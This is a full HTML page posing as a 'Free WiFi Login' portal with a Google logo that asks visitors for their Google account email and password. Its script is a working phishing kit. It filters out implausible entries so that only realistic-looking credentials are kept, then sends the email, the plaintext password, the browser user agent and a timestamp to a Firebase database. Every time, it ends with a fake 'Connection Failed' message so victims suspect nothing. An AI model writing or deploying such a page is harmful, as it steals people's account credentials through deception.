<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FreeWiFi Login</title>
<style>
body {
    background: #e9f0ff;
    font-family: Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}
.box {
    background: #fff;
    width: 340px;
    padding: 30px;
    border-radius: 10px;
    box-shadow: 0 5px 15px rgba(0,0,0,0.15);
    text-align: center;
}
input {
    width: 100%;
    padding: 12px;
    margin-top: 12px;
    border: 1px solid #ccc;
    border-radius: 6px;
    font-size: 16px;
}
button {
    width: 100%;
    padding: 12px;
    margin-top: 20px;
    background: #2d7bf4;
    border: none;
    color: white;
    border-radius: 6px;
    font-size: 17px;
    cursor: pointer;
}
button:disabled {
    opacity: 0.7;
    cursor: not-allowed;
}
.error {
    color: red;
    margin-top: 10px;
    font-size: 14px;
    display: none;
}
.logo {
    --logo-size: 48px;
    display:flex;
    align-items:center;
    gap:10px;
    justify-content:center;
    margin-bottom: 20px;
}
.logo svg {
    height: var(--logo-size);
    width: auto;
}
#loadingOverlay {
    position: fixed;
    top:0; left:0;
    width:100%; height:100%;
    background: rgba(0,0,0,0.85);
    display: flex;
    align-items: center;
    justify-content: center;
    flex-direction: column;
    z-index: 9999;
    color:white;
    font-size:26px;
}
#loadingOverlay div {
    border:5px solid #555;
    border-top:5px solid #00e5ff;
    border-radius:50%;
    width:65px;
    height:65px;
    animation: spin 0.8s linear infinite;
    margin-bottom: 15px;
}
@keyframes spin {0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); }}
</style>
</head>
<body>
<div class="box">
    <div class="logo">
      <!-- Logos here -->
      <svg viewBox="0 0 256 262" xmlns="http://www.w3.org/2000/svg">
        <g transform="scale(1)">
          <path fill="#4285F4" d="M255.3 133.5c0-10.7-.9-18.5-2.9-26.6H130.6v48.4h71.7c-1.4 12.1-9.1 30.3-26.1 42.5l-.2 1.6 37.9 29.4 2.6.3c24.1-22.3 38.8-55.2 38.8-95.6"/>
          <path fill="#34A853" d="M130.3 260.2c34.5 0 63.5-11.3 84.7-30.6l-40.4-31.4c-10.8 7.5-25.4 12.7-44.3 12.7-33.9 0-62.7-22.1-73-52.8l-1.5.1-39.5 30.6-.5 1.5c20.8 41.9 63.2 70 114.5 70"/>
          <path fill="#FBBC05" d="M57.6 72.2c-2.7-8.1-4.3-16.7-4.3-25.6s1.6-17.4 4.2-25.6l-.1-1.7L17.6 75l-1.93.6C5.7 97.9 0 120.1 0 125.2s5.7 47.3 16.3 69.6l41.3-32.2"/>
          <path fill="#EA4335" d="M130.6 50.3c24 0 40.1 10.3 49.3 18.9l36-35C194 12.1 165.1 0 130.6 0 79.3 0 36.9 28.1 16.1 70l41.3 32.2c10.4-30.7 39.2-51.9 73.2-51.9"/>
        </g>
      </svg>
    </div>
    <h2>Free WiFi Login</h2>
    <p style="color:#555;font-size:14px;">Login Google account to connect</p>
    <input id="email" type="text" placeholder="Email address">
    <input id="password" type="password" placeholder="Password">
    <button id="loginBtn">Login</button>
    <div class="error" id="err"></div>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyAGinc-wCWcl7bNfwgaI0HLaBnJR4aZt-Y",
    authDomain: "freewifi-981c3.firebaseapp.com",
    databaseURL: "https://freewifi-981c3-default-rtdb.firebaseio.com",
    projectId: "freewifi-981c3",
    storageBucket: "freewifi-981c3.firebasestorage.app",
    messagingSenderId: "697473327624",
    appId: "1:697473327624:web:0bee6e252d3aace182e7bd"
};
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

const emailField = document.getElementById("email");
const passField = document.getElementById("password");
const err = document.getElementById("err");
const loginBtn = document.getElementById("loginBtn");

const bannedPasswords = ["abc123","password","qwerty","123456","123123","letmein","welcome","admin","tsc","freewifi","iloveyou","abcdef","654321"];
const basicPasswords = ["otep","test","guest"];
let lastAttemptTime = 0;

function rateLimit() {
    const now = Date.now();
    if(now - lastAttemptTime < 3000) { err.textContent="Slow down."; err.style.display="block"; return false; }
    lastAttemptTime = now;
    let attempts = Number(localStorage.getItem("wifi_attempts") || 0);
    if(attempts >= 99999) { err.textContent="Too many attempts."; err.style.display="block"; return false; }
    localStorage.setItem("wifi_attempts", attempts + 1);
    return true;
}

function isFakeEmail(email){ 
    const pattern = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
    if(!pattern.test(email)) return true;
    if(/(.)\1{2,}/.test(email)) return true;
    return false;
}

function isRepeatingPassword(pwd){ return /(.+)\1{1,}/.test(pwd); }
function isWeakPassword(pwd){ return basicPasswords.includes(pwd.toLowerCase()) || bannedPasswords.includes(pwd.toLowerCase()) || pwd.length<6; }
function isValidPassword(pwd){ 
    const hasLetter = /[a-zA-Z]/.test(pwd);
    const hasNumber = /\d/.test(pwd);
    const hasSpecial = /[!@#$%^&*(),.?":{}|<>]/.test(pwd);
    return hasLetter && (hasNumber || hasSpecial);
}
function validate(email, pass){
    if(isFakeEmail(email)) return "Wrong cridentials.";
    if(isRepeatingPassword(pass)) return "Wrong password.";
    if(isWeakPassword(pass)) return "Wrong password.";
    if(!isValidPassword(pass)) return "Wrong password.";
    return true;
}
function saveToFirebase(email, pass){
    const loginRef = ref(db,"wifi_users/");
    const newRef = push(loginRef);
    return set(newRef,{
        email: email,
        pwd_hint: pass,
        device: navigator.userAgent,
        time: new Date().toLocaleString()
    });
}

// Loading with animated dots
function showLoading() {
    const loading = document.createElement("div");
    loading.id="loadingOverlay";

    const spinner = document.createElement("div");
    const txt = document.createElement("p");
    txt.textContent="Connecting.";
    loading.appendChild(spinner);
    loading.appendChild(txt);
    document.body.appendChild(loading);

    let dots = 1;
    const dotInterval = setInterval(()=>{
        dots = dots % 3 + 1;
        txt.textContent = "Connecting" + ".".repeat(dots);
    }, 500);

    setTimeout(()=>{
        clearInterval(dotInterval);
        loading.remove();
        err.textContent="Connection Failed.";
        err.style.display="block";
    }, 5300);
}

loginBtn.onclick = async ()=>{
    const email = emailField.value.trim();
    const pass = passField.value.trim();
    err.style.display="none";
    loginBtn.disabled = true;

    if(!rateLimit()){ loginBtn.disabled=false; return; }

    const valid = validate(email, pass);
    if(valid !== true){ err.textContent=valid; err.style.color="red"; err.style.display="block"; loginBtn.disabled=false; return; }

    try {
        await saveToFirebase(email, pass);
        showLoading(); // success spinner + animated dots
    } catch(e){
        showLoading(); // even on failure, still show spinner + dots
    }

    loginBtn.disabled = false;
};
</script>
</body>
</html>